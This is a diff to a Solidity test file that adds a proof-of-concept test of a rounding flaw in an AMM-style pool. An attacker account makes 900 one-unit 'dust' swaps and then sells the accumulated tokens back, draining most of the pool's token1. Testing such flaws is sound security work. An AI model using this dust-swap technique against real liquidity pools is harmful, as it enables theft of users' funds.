@@ -90,6 +90,47 @@ contract RoundingAttackTest is Test {
 
         assertEq(token1.balanceOf(attacker) - attackerToken1Start, 99_640);
 
+        // Assert the final state after selling the accumulated token0.
+        assertEq(roundUpPool.reserve0(), 1_000);
+        assertEq(roundUpPool.reserve1(), 900_360);
+        assertEq(roundUpPool.reserve0() * roundUpPool.reserve1(), 900_360_000);
+
+        assertEq(token0.balanceOf(address(roundUpPool)), roundUpPool.reserve0());
+        assertEq(token1.balanceOf(address(roundUpPool)), roundUpPool.reserve1());
+    }
+
+    function test_DustSwapAttackScalesWithSkewedReserves() public {
+        _seedRoundUpPool();
+
+        uint256 attackerToken1Start = token1.balanceOf(attacker);
+        uint256 kBefore = roundUpPool.reserve0() * roundUpPool.reserve1();
+
+        assertEq(kBefore, 1_000_000_000);
+
+        // Repeat the one-unit extraction 900 times.
+        for (uint256 i = 0; i < 900; i++) {
+            vm.prank(attacker);
+            assertEq(roundUpPool.swap(token1, 1, 0), 1);
+        }
+
+        assertEq(roundUpPool.reserve0(), 100);
+        assertEq(roundUpPool.reserve1(), 1_000_900);
+        assertEq(token0.balanceOf(attacker), 900);
+        assertEq(token1.balanceOf(attacker), 100);
+
+        // Sell all 900 accumulated token0 back into the pool.
+        vm.prank(attacker);
+        uint256 token1Received = roundUpPool.swap(token0, 900, 0);
+
+        assertEq(token1Received, 900_540);
+        assertEq(token1.balanceOf(attacker), 900_640);
+        assertEq(token1.balanceOf(attacker) - attackerToken1Start, 899_640);
+
+        // Assert the final pool state, after the sell-back.
+        assertEq(roundUpPool.reserve0(), 1_000);
+        assertEq(roundUpPool.reserve1(), 100_360);
+        assertEq(roundUpPool.reserve0() * roundUpPool.reserve1(), 100_360_000);
+
         assertEq(token0.balanceOf(address(roundUpPool)), roundUpPool.reserve0());
         assertEq(token1.balanceOf(address(roundUpPool)), roundUpPool.reserve1());
     }
